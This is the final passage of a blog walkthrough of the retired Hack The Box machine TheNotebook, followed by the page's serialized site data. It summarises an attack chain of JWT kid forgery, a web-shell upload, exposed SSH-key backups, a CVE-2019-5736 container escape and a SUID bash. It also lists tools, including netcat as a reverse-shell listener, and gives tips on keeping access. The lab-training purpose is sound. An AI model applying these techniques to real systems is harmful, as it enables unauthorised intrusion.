+<p><strong>Why didn't we need a password?</strong> The SUID bit bypasses all password checks. The binary runs with the permissions of its owner (root), not the user who launched it. This is a classic Unix privilege escalation technique.</p>
+<hr />
+<h2 id="phase-12-key-takeaways-and-hacker-mindset">Phase 12: Key Takeaways &amp; Hacker Mindset</h2>
+<h3 id="1-follow-the-hints">1. Follow the Hints</h3>
+<p>The box creator left explicit hints:</p>
+<ul>
+<li>The JWT cookie with <code>kid</code> pointing to a URL</li>
+<li>The admin note saying "PHP files are being executed"</li>
+<li>The admin note about "regular backups"</li>
+</ul>
+<p><strong>Lesson:</strong> Always read everything. Notes, error messages, source code comments — they often contain the path forward.</p>
+<h3 id="2-understand-the-technology-stack">2. Understand the Technology Stack</h3>
+<p>We didn't just blindly exploit JWT — we understood:</p>
+<ul>
+<li>How RS256 signing works (asymmetric cryptography)</li>
+<li>How <code>kid</code> is supposed to work vs. how it was misused</li>
+<li>How nginx proxies requests differently based on file extension</li>
+<li>How Docker and runc interact</li>
+</ul>
+<p><strong>Lesson:</strong> The more you understand the underlying technology, the faster you can identify misconfigurations.</p>
+<h3 id="3-layered-security-failures">3. Layered Security Failures</h3>
+<p>This box is a chain of failures:</p>
+<ol>
+<li>JWT <code>kid</code> accepts arbitrary URLs → admin access</li>
+<li>Admin file upload doesn't validate file type properly → web shell</li>
+<li>PHP execution on host (not container) → direct host access</li>
+<li>World-readable backups → SSH key exposure</li>
+<li>Outdated Docker → container escape</li>
+<li>Container escape → host root</li>
+</ol>
+<p><strong>Lesson:</strong> Real-world security is about chains. Breaking any one link stops the attack. As a defender, fix the weakest links first. As an attacker, find the chain.</p>
+<h3 id="4-container-security-is-host-security">4. Container Security is Host Security</h3>
+<p>Containers are NOT security boundaries by themselves. If a container runs as privileged, has dangerous capabilities, or the runtime is vulnerable, the host is compromised.</p>
+<p><strong>Lesson:</strong> Never run outdated container runtimes in production. CVE-2019-5736 was patched in 2019 — this box simulated what happens when you don't patch.</p>
+<h3 id="5-persistence-vs-one-shot">5. Persistence vs. One-Shot</h3>
+<p>Our first payload (SSH key) would have given persistent access even if the shell died. The SUID bash is also persistent. Always think about:</p>
+<ul>
+<li>How do I maintain access?</li>
+<li>How do I get back in if this shell dies?</li>
+<li>What evidence am I leaving behind?</li>
+</ul>
+<hr />
+<h2 id="tools-used">Tools Used</h2>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>nmap</td>
+<td>Port scanning and service enumeration</td>
+</tr>
+<tr>
+<td>feroxbuster/ffuf</td>
+<td>Directory brute-forcing</td>
+</tr>
+<tr>
+<td>jwt.io / Python jwt</td>
+<td>JWT decoding and forging</td>
+</tr>
+<tr>
+<td>openssl</td>
+<td>RSA key generation</td>
+</tr>
+<tr>
+<td>python3 -m http.server</td>
+<td>Hosting files for exfiltration/payload delivery</td>
+</tr>
+<tr>
+<td>nc (netcat)</td>
+<td>Reverse shell listener</td>
+</tr>
+<tr>
+<td>script + stty</td>
+<td>Shell stabilization</td>
+</tr>
+<tr>
+<td>tar</td>
+<td>Extracting files from archives</td>
+</tr>
+<tr>
+<td>go</td>
+<td>Building the CVE-2019-5736 exploit</td>
+</tr>
+<tr>
+<td>ssh</td>
+<td>Lateral movement and root access</td>
+</tr>
+</tbody></table>
+<hr />
+<h2 id="final-flags">Final Flags</h2>
+<pre><code>User: d208e56[redacted]0e762a26
+Root: 513fcaf[redacted]063ff500d5
+</code></pre>
+<p><strong>Box Complete!</strong> 🎉</p>
+15:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$19"}}]
+16:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$Lf",null,{"href":"/writing/hackthebox-travel-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Travel Walkthrough"}]]}]}],["$","$Lf",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$Lf",null,{"href":"/writing/hackthebox-vault-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Vault Walkthrough"}]]}]}]]}]
+17:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$Lf",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$Lf","Research",{"href":"/research","children":"Research"}],["$","$Lf","Services",{"href":"/services","children":"Services"}],["$","$Lf","Writing",{"href":"/writing","children":"Writing"}],["$","$Lf","Projects",{"href":"/projects","children":"Projects"}],["$","$Lf","About",{"href":"/about","children":"About"}],["$","$Lf","Contact",{"href":"/contact","children":"Contact"}],["$","$Lf","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$Lf",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+1a:T543,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-thenotebook-walkthrough/#article","headline":"Hack The Box: TheNotebook Walkthrough","description":"An archived walkthrough of the retired Hack The Box TheNotebook machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-thenotebook-walkthrough/","datePublished":"2026-06-11T10:47:55.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2805,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/6f71c80df73bdd98a80290cd75796ac79a3c0ab9/HTB-TheNotebook.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-thenotebook-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-thenotebook-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: TheNotebook Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-thenotebook-walkthrough/"}]}]}18:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$1a"}}]
+a:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","2",{"name":"theme-color","content":"#f2ede3"}],["$","meta","3",{"name":"color-scheme","content":"light"}]]
+1b:I[1884,[],"IconMark"]
+7:null
+c:[["$","title","0",{"children":"Hack The Box: TheNotebook Walkthrough — CyberKareem"}],["$","meta","1",{"name":"description","content":"An archived walkthrough of the retired Hack The Box TheNotebook machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","8",{"name":"publisher","content":"CyberKareem"}],["$","meta","9",{"name":"robots","content":"index, follow"}],["$","link","10",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-thenotebook-walkthrough/"}],["$","meta","11",{"property":"og:title","content":"Hack The Box: TheNotebook Walkthrough"}],["$","meta","12",{"property":"og:description","content":"An archived walkthrough of the retired Hack The Box TheNotebook machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","13",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-thenotebook-walkthrough/"}],["$","meta","14",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","15",{"property":"og:locale","content":"en_US"}],["$","meta","16",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-thenotebook-walkthrough.webp"}],["$","meta","17",{"property":"og:image:width","content":"300"}],["$","meta","18",{"property":"og:image:height","content":"300"}],["$","meta","19",{"property":"og:image:alt","content":"Hack The Box TheNotebook machine avatar"}],["$","meta","20",{"property":"og:type","content":"article"}],["$","meta","21",{"property":"article:published_time","content":"2026-06-11T10:47:55.000Z"}],["$","meta","22",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","23",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","24",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","25",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","26",{"name":"twitter:title","content":"Hack The Box: TheNotebook Walkthrough"}],["$","meta","27",{"name":"twitter:description","content":"An archived walkthrough of the retired Hack The Box TheNotebook machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","28",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-thenotebook-walkthrough.webp"}],["$","link","29",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","$L1b","30",{}]]
